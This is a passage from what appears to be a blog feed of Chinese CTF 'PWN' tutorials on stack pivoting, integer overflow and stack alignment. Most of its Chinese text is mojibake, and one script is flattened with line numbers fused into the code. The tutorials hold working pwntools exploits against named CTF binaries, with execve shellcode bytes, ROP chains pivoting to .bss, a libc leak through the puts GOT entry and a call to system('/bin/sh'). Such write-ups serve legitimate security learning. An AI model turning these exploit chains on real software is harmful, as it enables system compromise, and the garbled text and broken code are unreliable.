rsp/esp</code><br>å½“ç„¶ï¼Œè¿˜ä¼šæœ‰ä¸€äº›å…¶å®ƒçš„å§¿åŠ¿ã€‚æ¯”å¦‚è¯´libc_csu_initä¸­çš„gadgetsï¼Œæˆ‘ä»¬é€šè¿‡åç§»å°±å¯ä»¥å¾—åˆ°æ§åˆ¶rspæŒ‡é’ˆ<br>ä¸Šé¢æ˜¯æ­£å¸¸çš„ï¼Œä¸‹é¢æ˜¯åç§»çš„<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217164554.png" alt="Pasted image 20250217164554"><br>æ­¤å¤–ï¼Œè¿˜æœ‰æ›´åŠ é«˜çº§çš„ fake frame</li><li>å­˜åœ¨å¯ä»¥æ§åˆ¶å†…å®¹çš„å†…å­˜ï¼Œä¸€èˆ¬æœ‰å¦‚ä¸‹</li><li>bssæ®µã€‚ç”±äºè¿›ç¨‹æŒ‰é¡µåˆ†é…å†…å­˜ï¼Œåˆ†é…ç»™bssæ®µçš„å†…å­˜å¤§å°è‡³å°‘ä¸€ä¸ªé¡µ(4kï¼Œ0x1000)å¤§å°ã€‚ç„¶è€Œä¸€èˆ¬bssæ®µçš„å†…å®¹ç”¨ä¸äº†è¿™ä¹ˆå¤šçš„ç©ºé—´ï¼Œå¹¶ä¸”bssæ®µåˆ†é…çš„å†…å­˜é¡µæ‹¥æœ‰è¯»å†™æƒé™ã€‚</li><li>heapã€‚ä½†æ˜¯è¿™ä¸ªéœ€è¦æˆ‘ä»¬èƒ½å¤Ÿæ³„éœ²å †åœ°å€</li></ul><h2 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h2><blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w">ctf-challenges/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w at master Â· ctf-wiki/ctf-challenges</a></p></blockquote><p>32ä½ï¼Œä¿æŠ¤å…¨å…³ï¼Œæ³ªç›®<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217165404.png" alt="Pasted image 20250217165404"></p><p>æœ‰è¾“å…¥ç‚¹,æµ‹ä¸€ä¸‹åç§»<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217170719.png" alt="Pasted image 20250217170719"></p><p>36ä¸ªå¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œ32ä¸ªè¦†ç›–åˆ°ebp(æ ˆåº•)<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217182115.png" alt="Pasted image 20250217182115"></p><p>åªèƒ½æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œå¾ˆéš¾æ‰§è¡Œä¸€äº›æ¯”è¾ƒå¥½çš„ROPï¼Œè€ƒè™‘æ ˆè¿ç§»<br>æ²¡æœ‰å¼€å¯å †æ ˆä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›´æ¥åœ¨æ ˆä¸Šå¸ƒç½®shellcodeå¹¶æ‰§è¡Œ<br>æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨æ ˆæº¢å‡ºå¸ƒç½®shellcode</li><li>æ§åˆ¶eipæŒ‡å‘shellcodeå¤„<blockquote><p>payloadçš„é•¿åº¦ä¸º44å­—èŠ‚ï¼Œå…¶ä¸­çš„shellcode_x86é•¿åº¦ä¸º22å­—èŠ‚ï¼Œä¸èƒ½ç›´æ¥å°†shellcodeæ³¨å…¥æ ˆä¸­ï¼Œå¦åˆ™ä¼šç ´åæ ˆ</p></blockquote></li></ul><p>å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå¯¹espè¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘shellcodeå¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³espå¤„ã€‚é‚£ä¸‹é¢å°±æ˜¯æ‰¾æ§åˆ¶ç¨‹åºè·³è½¬åˆ°espçš„gadgetsäº†<br>æˆ‘ä»¬æœç´¢ä¸€ä¸‹å¯ä»¥æ§åˆ¶ç¨‹åºè·³è½¬åˆ°espå¤„çš„gadget<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217193710.png" alt="Pasted image 20250217193710">æˆ‘ä»¬éœ€è¦jmp esp<br>å› æ­¤å°†shellcodeå¸ƒå±€å¦‚ä¸‹<br><strong>shellcode</strong>|<strong>padding</strong>|<strong>fake epb</strong>|<strong>0x08048504</strong>|<strong>set esp point to shellcode and jmp esp</strong>|<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217205904.png" alt="Pasted image 20250217205904"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *sh &#x3D; process(&#39;.&#x2F;b0verfl0w&#39;)shellcode_x86 &#x3D; b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode_x86 +&#x3D; b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode_x86 +&#x3D; b&quot;\x0b\xcd\x80&quot;sub_esp_jmp &#x3D; asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp &#x3D; 0x08048504payload &#x3D; shellcode_x86 + (    0x20 - len(shellcode_x86)) * b&#39;b&#39; + b&#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmpsh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217180521.png" alt="Pasted image 20250217180521"><br>å…ˆæŠŠå­—èŠ‚ç è½¬ä¸ºæ±‡ç¼–<br><strong><em>getshell!</em></strong><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217210219.png" alt="Pasted image 20250217210219"></p><h2 id="ç¤ºä¾‹2-x86"><a href="#ç¤ºä¾‹2-x86" class="headerlink" title="ç¤ºä¾‹2(x86)"></a>ç¤ºä¾‹2(x86)</h2><blockquote><p>å‚è€ƒ:<a href="https://blog.csdn.net/qq_38154820/article/details/106330238">32ä½ä»¥åŠ64ä½æ ˆè¿ç§»çš„å…·ä½“åˆ†æä¸å­¦ä¹ -CSDNåšå®¢</a><br><a href="https://www.yuque.com/wendyjellybeans/mhpnug/lcfyf0#VAWnD">Hitcon-Training lab1-lab15</a></p></blockquote><p>æ ˆè¿ç§»çš„æŠ€æœ¯ï¼Œåˆ†ä¸º32ä½å’Œ64ä½ELFï¼Œæˆ‘ä»¬å…ˆæ¥å­¦ä¹ 32ä½æ ˆè¿ç§»<br>æ˜ç¡®ä¸€ä¸ªè§‚ç‚¹ï¼Œ<strong>æ ˆçš„å†…å®¹å³ç¨‹åºEIPæ‰§è¡Œçš„æµç¨‹(å› ä¸ºæˆ‘ä»¬æ€»æ˜¯è¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€)</strong><br><strong>æ ˆä¸­çš„å†…å®¹éƒ½æ˜¯</strong>æ ˆï¼šå‡½æ•° è¿”å›åœ°å€ å‚æ•°</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ ˆè¿ç§»æ­£å¦‚å®ƒæ‰€æè¿°çš„ï¼Œè¯¥æŠ€å·§å°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ‰€èƒ½æ§åˆ¶çš„å†…å­˜å¤„ï¼Œç„¶åå†åœ¨ç›¸åº”çš„ä½ç½®è¿›è¡Œ ROPã€‚æˆ‘ä»¬å¯åˆ©ç”¨è¯¥æŠ€å·§<strong>æ¥è§£å†³æ ˆæº¢å‡ºç©ºé—´å¤§å°ä¸è¶³çš„é—®é¢˜</strong>ã€‚<br>æˆ‘ä»¬è¿›å…¥ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šæ‰§è¡ŒcallæŒ‡ä»¤<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">call func();    &#x2F;&#x2F;push eip+4;  push ebp;   mov ebp,esp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>call func() æ‰§è¡Œå®Œè¦é€€å‡ºçš„æ—¶å€™è¦è¿›è¡Œä¸call funcç›¸åçš„æ“ä½œï¼ˆæ¢å¤ç°åœºï¼‰ç»´æŒæ ˆå¹³è¡¡ï¼<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">leave;          &#x2F;&#x2F;mov esp,ebp;  pop ebp;ret ;            &#x2F;&#x2F; pop eip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>æ ˆè¿ç§»çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯å°†æ ˆ çš„esp å’Œ ebp è½¬ç§»åˆ°ä¸€ä¸ªè¾“å…¥ä¸å—é•¿åº¦é™åˆ¶çš„ä¸”å¯æ§åˆ¶çš„åœ°å€å¤„ï¼Œé€šå¸¸æ˜¯ bss æ®µåœ°å€ã€‚<br>åœ¨æœ€året çš„æ—¶å€™  å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æ ˆé¡¶ espæŒ‡å‘çš„åœ°å€å°±æƒ³åˆ°æ§åˆ¶äº†ç¨‹åºæ‰§è¡Œæµï¼<br><a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049">æ ˆçš„è¿ç§»æŠ€å·§åœ¨CTF pwnæŒ‘æˆ˜ä¸­çš„åº”ç”¨-CSDNåšå®¢</a></p><p>xxxxxxxxxx28 1from pwn import <em>2context(os=â€™linuxâ€™, arch=â€™amd64â€™, log_level=â€™debugâ€™)3â€‹4io = process(â€˜./pwn2â€™)5elf = ELF(â€˜./pwn2â€™)6â€‹7vul = 0x4009E78write = 0x4009DD9â€‹10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315â€‹16payload  = â€œAâ€</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[â€˜<strong>stack_protâ€™]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[â€˜</strong>libc_stack_endâ€™]) + p64(elf.sym[â€˜_dl_make_stack_executableâ€™])19payload += p64(vul)20â€‹21io.sendlineafter(â€˜welcome~\nâ€™, payload)22â€‹23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, â€œAâ€) + p64(jmp_rsi)25â€‹26io.sendline(payload)27â€‹28io.interactive()python</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218144214.png" alt="Pasted image 20250218144214"><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218163306.png" alt="Pasted image 20250218163306"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pay1&#x3D;b&#39;a&#39;*(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2&#x3D;p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)payload2+&#x3D;p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload3&#x3D;p32(buf)+p32(read_plt)+p32(pop3ret)+p32(0)+p32(buf)+p32(0x100)payload3+&#x3D;p32(system_addr)+p32(0xdeadbeef)+p32(buf)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å…·ä½“æµç¨‹è¯¦è§excel<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *io&#x3D;process(&#39;.&#x2F;migration&#39;)elf&#x3D;ELF(&#39;.&#x2F;migration&#39;)libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)context.log_level&#x3D;&quot;debug&quot;  buf&#x3D;elf.bss()+0x500buf1&#x3D;elf.bss()+0x400print(hex(buf1))read_plt&#x3D;elf.plt[&#39;read&#39;]leave_ret&#x3D;0x08048504# 0x08048504 : leave ; retpayload1&#x3D;b&#39;a&#39;*(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)io.sendafter(b&#39;best :\n&#39;,payload1)puts_plt&#x3D;elf.plt[&#39;puts&#39;]pop_ebx_ret&#x3D;0x804836dputs_got&#x3D;elf.got[&#39;puts&#39;]payload2&#x3D;p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)payload2+&#x3D;p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)  io.sendline(payload2)  puts_addr&#x3D;u32(io.recv(4))  success(&quot;puts_addr &#x3D;&#x3D;&gt; &quot;+hex(puts_addr))libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]print(hex(system_addr))  pop3ret&#x3D;0x08048569payload3&#x3D;p32(buf)+p32(read_plt)+p32(pop3ret)+p32(0)+p32(buf)+p32(0x100)payload3+&#x3D;p32(system_addr)+p32(0xdeadbeef)+p32(buf)io.sendline(payload3)io.sendline(&quot;&#x2F;bin&#x2F;sh\0&quot;)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ•´æ•°æº¢å‡º</title>
      <link href="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h2><p>å†è¯´æ•´æ•°æº¢å‡ºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆçš„å…ˆæ¥è¯´ä¸€ä¸‹Cè¯­è¨€ä¸­çš„æ•´å‹çš„æ•°æ®åˆ†ç±»ã€‚<br>æŒ‰<strong>æ•°æ®ç±»å‹</strong>åˆ†ç±»ä¸»è¦åˆ†ä¸‰ç±»ï¼šçŸ­æ•´å‹ï¼ˆshort)ã€æ•´å‹(int)ã€é•¿æ•´å‹(long)<br>æŒ‰<strong>ç¬¦å·</strong>åˆ†ç±»ï¼šæœ‰ç¬¦å·ã€æ— ç¬¦å·<br>å¹¶ä¸”æ¯ç§æ•°æ®ç±»å‹éƒ½æœ‰è‡ªå·±çš„å¤§å°èŒƒå›´<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20250119185759490.png" alt="image-20250119185759490"><br><strong>æ•´å½¢ï¼š</strong></p><p><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250214231319.png" alt="Pasted image 20250214231319"></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main()&#123;    unsigned short int a &#x3D; 1;    unsigned short int b &#x3D; 65537;    if(a &#x3D;&#x3D; b)&#123;        printf(&quot;Int overflow successfully!\n&quot;);    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘<br><code>gcc -g test.c -o test</code><br>è¿è¡Œä¸€ä¸‹ç¨‹åºè¾“å‡ºInt overflow successfully!<br>unsigned short intçš„èŒƒå›´æ˜¯0~65535ï¼Œå¯¹å˜é‡bçš„èµ‹å€¼è¶…è¿‡äº†è¿™ä¸ªèŒƒå›´ï¼Œå› æ­¤hexçš„æ•°æ®æœ€é«˜ä½è¢«æˆªæ–­ï¼Œä»è€Œå˜æˆäº†0x0001=1</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p><a href="https://www.52pojie.cn/thread-1032448-1-1.html">XCTFæ”»é˜²ä¸–ç•Œint_overflow - å¾çˆ±ç ´è§£ - 52pojie.cn</a><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215181914.png" alt="Pasted image 20250215181914"><br>åªå¼€NX(æ ˆä¸Šä¸å¯æ‰§è¡Œä¿æŠ¤)ï¼Œç›¸å½“äºæ²¡æœ‰å¼€ä¿æŠ¤<br>æ”¾å…¥IDAä¸­<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182050.png" alt="Pasted image 20250215182050"><br>mainå‡½æ•°é€‰æ‹©åŠŸèƒ½ï¼Œæ¯”è¾ƒç®€å•ï¼Œçœ‹çœ‹loginï¼Œä¸¤ä¸ªå¯ä»¥åˆ©ç”¨çš„read<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182113.png" alt="Pasted image 20250215182113"></p><blockquote><p>çœ‹loginå‡½æ•°ï¼Œ0x19uè¡¨ç¤ºæ— ç¬¦å·æ•°</p></blockquote><p>çœ‹çœ‹check_passwdå‡½æ•°<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182313.png" alt="Pasted image 20250215182313"></p><ul><li>unsigned__int8è¡¨ç¤º8bitæ— ç¬¦å·æ•´æ•°ï¼Œå¯èƒ½å­˜åœ¨æ•´æ•°æº¢å‡º</li><li>max_passwdä¸º0x199ï¼Œæ•°æ®è¿‡å¤§</li><li>é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œå¯å°†v2å®é™…é•¿åº¦(260-264)æˆªæ–­å˜æˆ(4-8)<br>åŒæ—¶è¿˜èƒ½æ‰¾åˆ°ä¸€ä¸ªåé—¨å‡½æ•°<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182359.png" alt="Pasted image 20250215182359"><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185941.png" alt="Pasted image 20250215185941"><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p&#x3D;process(&quot;.&#x2F;IntOverflow&quot;)  p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)p.sendlineafter(&quot;username:\n&quot;,&quot;zechariah&quot;)cat_flag_addr &#x3D; 0x08048694payload &#x3D; b&quot;A&quot; * 0x18  + p32(cat_flag_addr) + b&quot;A&quot; * 234p.sendlineafter(&quot;passwd:\n&quot;,payload)print (p.recvall())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185924.png" alt="Pasted image 20250215185924"><br><strong><em>get shell!</em></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ•´æ•°æº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-æ ˆå¯¹é½</title>
      <link href="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/"/>
      <url>/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<p><strong>ï¼ˆUbuntu 18.04ç‰ˆæœ¬åŠä»¥ä¸Šéœ€è€ƒè™‘ ï¼‰</strong></p><h2 id="ç½ªé­ç¥¸é¦–"><a href="#ç½ªé­ç¥¸é¦–" class="headerlink" title="ç½ªé­ç¥¸é¦–"></a>ç½ªé­ç¥¸é¦–</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">movaps xmmword ptr [rsp + 0x50], xmm0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä» <a href="https://link.zhihu.com/?target=https%3A//www.felixcloutier.com/x86/movaps">https://www.felixcloutier.com/x86/movaps</a> å¤„æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ¡æŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ï¼š <strong>å°†xmm0ä¸­ä¿å­˜çš„å•ç²¾åº¦æµ®ç‚¹æ•°ä»xmm0ç§»åŠ¨è‡³åœ°å€[rsp + 0x50]å¤„</strong> ã€‚</p><p>å½“ç„¶ï¼Œæ›´é‡è¦çš„æ˜¯è¿™æ¡æŒ‡ä»¤çš„æ‰§è¡Œæ¡ä»¶ï¼Œè¿™ç›´æ¥å…³ç³»åˆ°ç¨‹åºæŠ¥é”™çš„åŸå› ã€‚åŸæ–‡ä¸­å¯¹æ‰§è¡Œæ¡ä»¶çš„æè¿°å¦‚ä¸‹ï¼š</p><blockquote><p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated.</p></blockquote><p>æ­¤æ—¶æŠ¥é”™çš„åŸå› å°±æ˜¾è€Œæ˜“è§äº†ï¼šå½“å†…å­˜åœ°å€ä½œä¸ºæ“ä½œæ•°æ—¶ï¼Œå†…å­˜åœ°å€å¿…é¡»å¯¹é½ <strong>16Byte</strong> ã€ <strong>32Byte</strong> æˆ– <strong>64Byte</strong> ã€‚è¿™é‡Œæ‰€è¯´çš„å¯¹é½ <strong>xByte</strong>ï¼Œå°±æ˜¯æŒ‡åœ°å€å¿…é¡»æ˜¯ <strong>x</strong> çš„å€æ•°ã€‚</p><p>è¿™æ—¶åˆå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼šåˆ°åº•æ˜¯å¯¹é½å¤šå°‘å­—èŠ‚å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·ä¸€æ®µæè¿°ï¼š</p><blockquote><p>This instruction can be used to load an XMM, YMM or ZMM register from an 128-bit, 256-bit or 512-bit memory location, to store the contents of an XMM, YMM or ZMM register into a 128-bit, 256-bit or 512-bit memory location, or to move data between two XMM, two YMM or two ZMM registers.</p></blockquote><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼šä½¿ç”¨ <strong>XMM</strong> æ—¶ï¼Œéœ€è¦ <strong>16Byte</strong> å¯¹é½ï¼›ä½¿ç”¨ <strong>YMM</strong> æ—¶ï¼Œéœ€è¦ <strong>32Byte</strong> å¯¹é½ï¼›ä½¿ç”¨ <strong>ZMM</strong> æ—¶ï¼Œéœ€è¦ <strong>64Byte</strong> å¯¹é½ã€‚</p><p>è€Œæ­¤å¤„å‡ºé”™çš„æŒ‡ä»¤ä½¿ç”¨äº† <strong>XMM</strong> å¯„å­˜å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¡®ä¿åœ¨æ‰§è¡Œè¿™ä¸€æŒ‡ä»¤æ—¶ï¼Œ<strong>rsp + 0x50</strong> æ˜¯ <strong>16</strong> çš„å€æ•°ã€‚ç›´è§‚åœ°è¯´ï¼Œå°±æ˜¯è¯¥åœ°å€å¿…é¡»ä»¥æ•°å­— <strong>0</strong> ç»“å°¾ã€‚</p><p>åŸºäºä¸Šé¢çš„åˆ†æï¼Œè§£å†³æ–¹æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼šæˆ‘ä»¬éœ€è¦ä¿®æ”¹æ ˆçš„ç»“æ„ï¼Œä½¿å¾—ç¨‹åºæ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤æ—¶ï¼Œ <strong>rsp + 0x50</strong> æ˜¯16çš„æ•´æ•°å€ã€‚è¿™æ—¶ä¾¿å‡ºç°äº†ä¸¤ä¸ªéå¸¸å…·ä½“çš„é—®é¢˜ï¼š</p><ol><li>æˆ‘ä»¬è¯¥å¦‚ä½•ç¡®ä¿èƒ½è·å¾—shellçš„å‰æä¸‹ä¿®æ”¹æ ˆçš„ç»“æ„ï¼Ÿ</li><li>æˆ‘ä»¬è¯¥å°†æ ˆçš„ç»“æ„ä¿®æ”¹æˆä»€ä¹ˆæ ·å­ï¼Ÿ</li></ol><p>ç¬¬1ä¸ªé—®é¢˜å¾ˆå¥½å›ç­”â€”â€”æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<a href="https://zhida.zhihu.com/search?content_id=224123051&amp;content_type=Article&amp;match_order=1&amp;q=ROP&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDMwOTMyMTAsInEiOiJST1AiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMjQxMjMwNTEsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.L8JVxrrpFrSd3Q7y61JPlIZ6daxfKzmfw6aiQeBPI4I&amp;zhida_source=entity">ROP</a>çš„æ€æƒ³ï¼Œå†æ ˆä¸­æ·»åŠ è‹¥å¹²æ±‡ç¼–ç‰‡æ®µï¼Œä»¥ç¡®ä¿åœ¨èƒ½è·å¾—shellçš„å‰æä¸‹ä¿®æ”¹æ ˆçš„ç»“æ„ã€‚</p><p>æ¥ä¸‹æ¥å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼šæˆ‘ä»¬éœ€è¦å°†æ ˆä¿®æ”¹æˆä»€ä¹ˆæ ·å­ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œç”±äºç¨‹åºçš„ä»£ç æ˜¯ä¸å˜çš„ï¼Œå› æ­¤ç¨‹åºä»è¿›å…¥ <strong>vulnerable_function</strong> åˆ°æ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ ˆé¡¶ <strong>rsp</strong> çš„å˜åŒ–é‡æ˜¯ä¸å˜çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿›å…¥ <strong>vulnerable_function</strong> å‰çš„æ ˆç»“æ„ï¼Œè¿›è€Œå½±å“æ‰§è¡Œå‡ºé”™æŒ‡ä»¤å‰çš„æ ˆç»“æ„ã€‚</p><p>é‚£è¿™ä¸ªå˜åŒ–é‡å…·ä½“æ˜¯å¤šå°‘å‘¢ï¼Ÿé€šè¿‡GBDè°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿›å…¥ <strong>vulnerable_function</strong> å‰ï¼Œ<strong>rsp</strong> ä¸­çš„å€¼æ˜¯ <strong>0x7fffffffdf38</strong> ï¼›è€Œæ‰§è¡Œå‡ºé”™æŒ‡ä»¤å‰ï¼Œ<strong>rsp</strong> ä¸­çš„å€¼æ˜¯ <strong>0x7fffffffdba8</strong> ã€‚å› æ­¤ï¼Œä»è¿›å…¥ <strong>vulnerable_function</strong> åˆ°æ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤ï¼Œæ ˆé¡¶çš„å€¼å‡å°äº† <strong>0x390</strong> ã€‚</p><p>ä¸ºæ–¹ä¾¿è¡¨è¿°ï¼Œè®°è¿›å…¥ 